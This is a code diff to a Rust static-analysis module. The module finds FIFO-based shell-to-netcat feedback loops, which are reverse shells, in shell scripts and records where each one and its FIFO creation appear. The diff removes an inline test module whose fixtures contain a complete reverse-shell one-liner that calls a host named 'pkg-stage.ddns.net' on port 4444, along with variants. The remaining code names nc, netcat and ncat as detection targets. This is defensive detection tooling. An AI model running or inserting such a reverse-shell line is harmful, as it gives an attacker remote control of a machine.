@@ -1,16 +1,22 @@
-//! Bounded literal FIFO feedback recipes. These are source relationships,
-//! not observed execution, successful FIFO creation or a reachable caller.
-use super::{TreeCache, named_children};
+//! FIFO relations in shell source: the FIFOs a script creates, and the
+//! feedback loops that read a shell's stdin from a path a network client's
+//! stdout is redirected to. Each loop is reported wherever it is written,
+//! directly or in a literal `sh -c` argument, with the creation of its FIFO
+//! when the script has one; rules combine the relations.
+//!
+//! These are source relationships, not observed execution, successful FIFO
+//! creation or a reachable caller.
+use super::visit::Visit;
+use super::{TreeCache, named_children, text};
 use crate::{FileType, Values, value_key};
 use serde_json::{Value, json};
+use std::collections::{BTreeMap, BTreeSet};
 use tree_sitter::Node;
 
-const MAX_SOURCE_BYTES: usize = 8192;
+/// Largest `sh -c` argument parsed for loops.
 const MAX_BODY_BYTES: usize = 4096;
-
-fn text<'s>(node: Node<'_>, source: &'s str) -> &'s str {
-    node.utf8_text(source.as_bytes()).unwrap_or("")
-}
+/// Loops and FIFO creations each kept per file.
+const MAX_FACTS: usize = 64;
 
 fn children(node: Node<'_>) -> Vec<Node<'_>> {
     named_children(node).filter(|n| !n.is_extra()).collect()
@@ -22,6 +28,7 @@ fn word<'s>(node: Node<'_>, source: &'s str) -> Option<&'s str> {
         .filter(|s| !s.is_empty() && !s.contains(['$', '`', '\\']))
 }
 
+/// The literal command name and argument nodes of a simple command.
 fn command<'t, 's>(node: Node<'t>, source: &'s str) -> Option<(&'s str, Vec<Node<'t>>)> {
     if node.kind() != "command" {
         return None;
@@ -31,10 +38,10 @@ fn command<'t, 's>(node: Node<'t>, source: &'s str) -> Option<(&'s str, Vec<Node
     let [token] = name_children.as_slice() else {
         return None;
     };
-    let name = word(*token, source)?;
+    let program = word(*token, source)?;
     let mut args = Vec::new();
     for child in children(node) {
-        if child != node.child_by_field_name("name")? {
+        if child != name {
             // Assignment prefixes, substitutions and redirects are not argv.
             if !matches!(child.kind(), "word" | "number" | "raw_string" | "string") {
                 return None;
@@ -42,13 +49,19 @@ fn command<'t, 's>(node: Node<'t>, source: &'s str) -> Option<(&'s str, Vec<Node
             args.push(child);
         }
     }
-    Some((name, args))
+    Some((program, args))
+}
+
+/// `name` without a leading `/bin/` or `/usr/bin/`, the directories a
+/// script names system programs by.
+fn program(name: &str) -> &str {
+    name.strip_prefix("/usr/bin/")
+        .or_else(|| name.strip_prefix("/bin/"))
+        .unwrap_or(name)
 }
 
 fn shell(name: &str) -> bool {
-    ["sh", "bash", "dash"].into_iter().any(|base| {
-        name == base || name == format!("/bin/{base}") || name == format!("/usr/bin/{base}")
-    })
+    matches!(program(name), "sh" | "bash" | "dash")
 }
 
 /// Return the requested stream's sole literal path. Other redirects may only
@@ -103,25 +116,9 @@ fn redirected<'t, 's>(
     Some((body, path?, inline_descriptor))
 }
 
-fn discard_stderr<'t>(node: Node<'t>, source: &str) -> Option<Node<'t>> {
-    if node.kind() != "redirected_statement" {
-        return Some(node);
-    }
-    let body = node.child_by_field_name("body")?;
-    let redirects: Vec<_> = children(node).into_iter().filter(|n| *n != body).collect();
-    let [redirect] = redirects.as_slice() else {
-        return None;
-    };
-    if text(*redirect, source)
-        .split_whitespace()
-        .collect::<String>()
-        != "2>/dev/null"
-    {
-        return None;
-    }
-    Some(body)
-}
-
+/// The body of a quoted `sh -c` argument, when it holds only bare command
+/// words and redirections: no expansion, quoting or compound syntax for the
+/// nested parse to disagree with the shell about.
 fn literal_body<'s>(node: Node<'_>, source: &'s str) -> Option<&'s str> {
     let raw = text(node, source);
     let body = match node.kind() {
@@ -129,9 +126,6 @@ fn literal_body<'s>(node: Node<'_>, source: &'s str) -> Option<&'s str> {
         "string" => raw.strip_prefix('"')?.strip_suffix('"')?,
         _ => return None,
     };
-    // Bare command words and two redirections only. This excludes expansion,
-    // quoting, compound commands and nested parser/scanner ambiguity before
-    // the shared bounded parser sees the body.
     (body.len() <= MAX_BODY_BYTES
         && body
             .bytes()
@@ -139,232 +133,232 @@ fn literal_body<'s>(node: Node<'_>, source: &'s str) -> Option<&'s str> {
     .then_some(body)
 }
 
-fn feedback(body: &str, fifo: &str) -> Option<(String, String, String, u16)> {
-    if ![b'|', b'<', b'>']
-        .into_iter()
-        .all(|b| body.as_bytes().contains(&b))
-    {
+fn host_name(host: &str) -> bool {
+    host.parse::<std::net::IpAddr>().is_ok()
+        || host.len() <= 253
+            && host.split('.').all(|label| {
+                !label.is_empty()
+                    && label.len() <= 63
+                    && label
+                        .as_bytes()
+                        .first()
+                        .is_some_and(u8::is_ascii_alphanumeric)
+                    && label
+                        .as_bytes()
+                        .last()
+                        .is_some_and(u8::is_ascii_alphanumeric)
+                    && label
+                        .bytes()
+                        .all(|b| b.is_ascii_alphanumeric() || b == b'-')
+            })
+}
+
+/// One feedback loop: `<shell> <fifo | <client> <host> <port> >fifo`.
+struct Loop<'s> {
+    fifo: &'s str,
+    interpreter: &'s str,
+    network_client: &'s str,
+    host: &'s str,
+    port: u16,
+}
+
+/// The feedback loop `node` is, if it is one.
+fn feedback<'s>(node: Node<'_>, source: &'s str) -> Option<Loop<'s>> {
+    if node.has_error() {
         return None;
     }
-    let parsed = TreeCache::parse(body.as_bytes(), FileType::Shell, None);
-    let cache = parsed.cache()?;
-    let root = cache.tree().root_node();
-    if root.has_error() {
-        return None;
-    }
-    let nodes = children(root);
-    let [output] = nodes.as_slice() else {
-        return None;
-    };
-    let (pipeline, output_path, _) = redirected(*output, body, 1)?;
-    if output_path != fifo || pipeline.kind() != "pipeline" {
+    let (pipeline, fifo, _) = redirected(node, source, 1)?;
+    if pipeline.kind() != "pipeline" {
         return None;
     }
     let stages = children(pipeline);
     let [left, right] = stages.as_slice() else {
         return None;
     };
-    let operators: Vec<_> = (0..pipeline.child_count())
+    let mut operators = (0..pipeline.child_count())
         .filter_map(|i| pipeline.child(i))
-        .filter(|n| !n.is_named())
-        .map(|n| text(n, body))
-        .collect();
-    if operators != ["|"] {
+        .filter(|n| !n.is_named());
+    if operators.next().map(|n| text(n, source)) != Some("|") || operators.next().is_some() {
         return None;
     }
-    let (input, input_path, descriptor_arg) = redirected(*left, body, 0)?;
-    let (interpreter, mut args) = command(input, body)?;
+    let (input, input_path, descriptor_arg) = redirected(*left, source, 0)?;
+    let (interpreter, mut args) = command(input, source)?;
     if let Some(arg) = descriptor_arg {
         args.retain(|n| *n != arg);
     }
     if input_path != fifo || !shell(interpreter) || !args.is_empty() {
         return None;
     }
-    let (network, args) = command(*right, body)?;
-    if ![
-        "nc",
-        "netcat",
-        "ncat",
-        "/bin/nc",
-        "/usr/bin/nc",
-        "/usr/bin/netcat",
-        "/usr/bin/ncat",
-    ]
-    .contains(&network)
-    {
+    let (network_client, args) = command(*right, source)?;
+    if !matches!(program(network_client), "nc" | "netcat" | "ncat") {
         return None;
     }
     let [host, port] = args.as_slice() else {
         return None;
     };
-    let host = word(*host, body)?;
-    let dns_name = host.len() <= 253
-        && host.split('.').all(|label| {
-            !label.is_empty()
-                && label.len() <= 63
-                && label
-                    .as_bytes()
-                    .first()
-                    .is_some_and(u8::is_ascii_alphanumeric)
-                && label
-                    .as_bytes()
-                    .last()
-                    .is_some_and(u8::is_ascii_alphanumeric)
-                && label
-                    .bytes()
-                    .all(|b| b.is_ascii_alphanumeric() || b == b'-')
-        });
-    if host.parse::<std::net::IpAddr>().is_err() && !dns_name {
-        return None;
-    }
-    let port = word(*port, body)?.parse::<u16>().ok().filter(|p| *p != 0)?;
-    Some((interpreter.into(), network.into(), host.into(), port))
+    let host = word(*host, source).filter(|host| host_name(host))?;
+    let port = word(*port, source)?
+        .parse::<u16>()
+        .ok()
+        .filter(|p| *p != 0)?;
+    Some(Loop {
+        fifo,
+        interpreter,
+        network_client,
+        host,
+        port,
+    })
 }
 
-pub(super) fn emit(root: Node<'_>, source: &str, values: &mut Values) {
-    if source.len() > MAX_SOURCE_BYTES || root.has_error() {
-        return;
+/// Loops and FIFO creations the shared walk ([`super::visit`]) reaches.
+#[derive(Default)]
+pub(super) struct Collector {
+    loops: Vec<Value>,
+    /// FIFO path → offset of the first `mkfifo` creating it.
+    fifos: BTreeMap<String, usize>,
+    /// Names the script defines as functions, which shadow programs.
+    functions: BTreeSet<String>,
+    limited: bool,
+}
+
+impl Collector {
+    pub(super) fn enter(&mut self, visit: &Visit<'_>, source: &str) {
+        let node = visit.node;
+        match node.kind() {
+            "function_definition" => {
+                if let Some(name) = node.child_by_field_name("name") {
+                    self.functions.insert(text(name, source).to_string());
+                }
+            }
+            "redirected_statement" => {
+                if let Some(found) = feedback(node, source) {
+                    self.push(&found, node.start_byte(), None);
+                }
+            }
+            "command" if !node.has_error() => self.command(node, source),
+            _ => {}
+        }
     }
-    let nodes = children(root);
-    if !(2..=4).contains(&nodes.len()) {
-        return;
-    }
-    let [creation_node, invocation, trailing @ ..] = nodes.as_slice() else {
-        return;
-    };
-    let Some((creation, args)) = command(*creation_node, source) else {
-        return;
-    };
-    if !["mkfifo", "/usr/bin/mkfifo", "/bin/mkfifo"].contains(&creation) {
-        return;
-    }
-    let [fifo_arg] = args.as_slice() else {
-        return;
-    };
-    let Some(fifo) = word(*fifo_arg, source).filter(|s| s.starts_with('/')) else {
-        return;
-    };
-    let Some(invocation) = discard_stderr(*invocation, source) else {
-        return;
-    };
-    let Some((caller, args)) = command(invocation, source) else {
-        return;
-    };
-    let [option, payload] = args.as_slice() else {
-        return;
-    };
-    if !shell(caller) || !matches!(word(*option, source), Some("-c" | "-lc")) {
-        return;
-    }
-    // Only optional disown and removal of that same FIFO may follow. There
-    // are no aliases, function definitions, PATH writes or unknown callbacks
-    // in this closed recipe.
-    for node in trailing {
-        let Some(node) = discard_stderr(*node, source) else {
-            return;
-        };
+
+    fn command(&mut self, node: Node<'_>, source: &str) {
         let Some((name, args)) = command(node, source) else {
             return;
         };
-        if name == "disown" && args.is_empty() {
-            continue;
+        if program(name) == "mkfifo" {
+            for path in args.iter().filter_map(|arg| word(*arg, source)) {
+                if path.starts_with('/') && self.fifos.len() < MAX_FACTS {
+                    self.fifos
+                        .entry(path.to_string())
+                        .or_insert(node.start_byte());
+                }
+            }
+            return;
         }
-        let [option, path] = args.as_slice() else {
+        let [option, payload] = args.as_slice() else {
             return;
         };
-        if !["rm", "/bin/rm", "/usr/bin/rm"].contains(&name)
-            || word(*option, source) != Some("-f")
-            || word(*path, source) != Some(fifo)
+        if !shell(name) || !matches!(word(*option, source), Some("-c" | "-lc")) {
+            return;
+        }
+        let Some(body) = literal_body(*payload, source) else {
+            return;
+        };
+        if ![b'|', b'<', b'>']
+            .into_iter()
+            .all(|b| body.as_bytes().contains(&b))
         {
             return;
         }
+        let parsed = TreeCache::parse(body.as_bytes(), FileType::Shell, None);
+        let Some(cache) = parsed.cache() else {
+            tracing::debug!(
+                target: "filefacts::source",
+                format = "shell",
+                offset = payload.start_byte(),
+                len = body.len(),
+                error = parsed.diagnostic().map_or("", |d| d.message.as_str()),
+                "shell fifo: `sh -c` argument did not parse"
+            );
+            return;
+        };
+        // The body starts one byte into the quoted argument.
+        let payload_offset = payload.start_byte() + 1;
+        for statement in children(cache.tree().root_node()) {
+            if let Some(found) = feedback(statement, cache.source()) {
+                self.push(
+                    &found,
+                    payload_offset + statement.start_byte(),
+                    Some((node.start_byte(), payload_offset)),
+                );
+            }
+        }
     }
-    let Some(body) = literal_body(*payload, source) else {
-        return;
-    };
-    let Some((interpreter, network, host, port)) = feedback(body, fifo) else {
-        return;
-    };
-    values.insert_key(
-        value_key!("source.shell.fifo_network_loops"),
-        Value::Array(vec![json!({
-            "mechanism": "fifo-shell-netcat-feedback", "fifo": fifo,
-            "interpreter": interpreter, "network_client": network, "host": host, "port": port,
-            "creation_offset": creation_node.start_byte(), "command_offset": invocation.start_byte(),
-            "payload_offset": payload.start_byte() + 1
-        })]),
-    );
+
+    /// Record a loop at `offset`, inside the `sh -c` command and argument
+    /// at `nested` when it is in one.
+    fn push(&mut self, found: &Loop<'_>, offset: usize, nested: Option<(usize, usize)>) {
+        if self.loops.len() >= MAX_FACTS {
+            self.limited = true;
+            return;
+        }
+        self.loops.push(json!({
+            "fifo": found.fifo,
+            "interpreter": found.interpreter,
+            "network_client": found.network_client,
+            "host": found.host,
+            "port": found.port,
+            "offset": offset,
+            "shell_command_offset": nested.map(|(command, _)| command),
+            "payload_offset": nested.map(|(_, payload)| payload),
+        }));
+    }
+
+    /// Write `source.shell.fifos` and `source.shell.fifo_network_loops`.
+    pub(super) fn emit(mut self, values: &mut Values) {
+        if self.limited {
+            tracing::debug!(
+                target: "filefacts::source",
+                format = "shell",
+                max = MAX_FACTS,
+                "shell fifo: loop budget reached; later loops omitted"
+            );
+        }
+        // A function named like the shell or the client replaces the
+        // program, so the loop is not the program's.
+        let functions = &self.functions;
+        self.loops.retain(|row| {
+            ["interpreter", "network_client"].iter().all(|field| {
+                row[field]
+                    .as_str()
+                    .is_none_or(|name| !functions.contains(name))
+            })
+        });
+        for row in &mut self.loops {
+            let created = row["fifo"]
+                .as_str()
+                .and_then(|fifo| self.fifos.get(fifo))
+                .copied();
+            row["fifo_created_offset"] = json!(created);
+        }
+        if !self.fifos.is_empty() {
+            values.insert_key(
+                value_key!("source.shell.fifos"),
+                Value::Array(
+                    self.fifos
+                        .iter()
+                        .map(|(path, offset)| json!({"path": path, "offset": offset}))
+                        .collect(),
+                ),
+            );
+        }
+        if !self.loops.is_empty() {
+            values.insert_key(
+                value_key!("source.shell.fifo_network_loops"),
+                Value::Array(self.loops),
+            );
+        }
+    }
 }
 
 #[cfg(test)]
-mod tests {
-    use super::*;
-    const SOURCE: &str = "mkfifo /tmp/.x11r; sh -c 'sh </tmp/.x11r | nc pkg-stage.ddns.net 4444 >/tmp/.x11r' 2>/dev/null & disown; rm -f /tmp/.x11r 2>/dev/null\n";
-    fn facts(source: &str) -> Value {
-        let parsed = crate::OpenOptions::new()
-            .path(std::path::Path::new("fixture.sh"))
-            .open(source.as_bytes());
-        parsed
-            .values()
-            .get("source.shell.fifo_network_loops")
-            .cloned()
-            .unwrap_or(Value::Null)
-    }
-    #[test]
-    fn binds_declared_fifo_both_streams_and_literal_command_argument() {
-        let rows = facts(SOURCE);
-        assert_eq!(rows[0]["fifo"], "/tmp/.x11r");
-        assert_eq!(rows[0]["host"], "pkg-stage.ddns.net");
-        assert_eq!(rows[0]["port"], 4444);
-        assert_eq!(rows[0]["payload_offset"], 26);
-        let renamed = SOURCE
-            .replace("/tmp/.x11r", "/var/tmp/other-pipe")
-            .replace("pkg-stage.ddns.net", "192.0.2.9")
-            .replace("4444", "2345");
-        assert_eq!(facts(&renamed)[0]["port"], 2345);
-        let absolute = SOURCE
-            .replace("sh -c", "/bin/bash -c")
-            .replace("sh <", "/bin/bash <")
-            .replace("nc pkg-stage", "/usr/bin/nc pkg-stage");
-        assert_eq!(facts(&absolute)[0]["network_client"], "/usr/bin/nc");
-        let minimal = "mkfifo /tmp/f; sh -c \"sh </tmp/f | nc 192.0.2.1 8080 >/tmp/f\"";
-        assert_eq!(facts(minimal)[0]["fifo"], "/tmp/f");
-        let explicit = SOURCE.replace("sh <", "sh 0<").replace("4444 >", "4444 1>");
-        assert_eq!(facts(&explicit)[0]["fifo"], "/tmp/.x11r");
-    }
-    #[test]
-    fn rejects_broken_paths_directions_non_shells_and_unrelated_commands() {
-        let variants = [
-            SOURCE.replacen("mkfifo /tmp/.x11r", "mkfifo /tmp/other", 1),
-            SOURCE.replace("sh </tmp/.x11r", "sh </tmp/other"),
-            SOURCE.replace(">/tmp/.x11r", ">/tmp/other"),
-            SOURCE.replace("sh </tmp/.x11r", "cat </tmp/.x11r"),
-            SOURCE.replace("sh </tmp/.x11r", "sh 1</tmp/.x11r"),
-            SOURCE.replace("sh </tmp/.x11r", "sh 0 </tmp/.x11r"),
-            SOURCE.replace(">/tmp/.x11r", "2>/tmp/.x11r"),
-            SOURCE.replace("sh -c", "echo -c"),
-            SOURCE.replace("4444", "0"),
-            SOURCE.replace("4444", "65536"),
-            SOURCE.replace("pkg-stage.ddns.net", "http://example.test"),
-            SOURCE.replace("pkg-stage.ddns.net", "bad-.example.test"),
-            format!("sh() {{ printf '%s' \"$*\"; }}\n{SOURCE}"),
-            SOURCE.replace("& disown", "& override; disown"),
-            SOURCE.replace("sh </tmp/.x11r", "sh -c ignored </tmp/.x11r"),
-            SOURCE.replace("nc pkg-stage", "echo pkg-stage"),
-        ];
-        for variant in variants {
-            assert_eq!(facts(&variant), Value::Null, "{variant}");
-        }
-    }
-    #[test]
-    fn data_comments_and_dynamic_payloads_do_not_supply_flow() {
-        for source in [
-            format!("# {SOURCE}"),
-            format!("printf '%s' {SOURCE:?}"),
-            SOURCE.replace("pkg-stage.ddns.net", "${{HOST}}"),
-            SOURCE.replace("sh </tmp/.x11r", "sh </tmp/$(choose)"),
-        ] {
-            assert_eq!(facts(&source), Value::Null, "{source}");
-        }
-    }
-}
+mod tests;
